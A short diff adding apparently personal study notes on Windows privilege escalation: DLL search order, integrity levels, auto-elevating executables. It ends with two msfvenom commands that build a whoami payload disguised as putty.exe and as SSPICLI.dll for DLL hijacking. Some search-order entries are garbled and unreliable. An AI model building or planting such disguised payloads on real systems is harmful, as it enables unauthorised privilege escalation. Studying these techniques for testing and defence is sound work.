@@ -1,0 +1,13 @@
+  <> Priviledge Escalation <>
+>> DLL search order
+>>>> HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+\_ Directory it was run from
+\_ Directory is specified in C+ func to GetWindowsDirectory() if not GetSystemDirectory() 
+\_ Current Directory
+>> Windows Integrity Mechanism
+>>>> Untrusted, Low, Medium, High, System
+>> AutoElevate Executables
+>>>> asInvoker or highestAvailable
+---------------------------------------------------------------------------------------
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f exe > putty.exe
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f dll > SSPICLI.dll
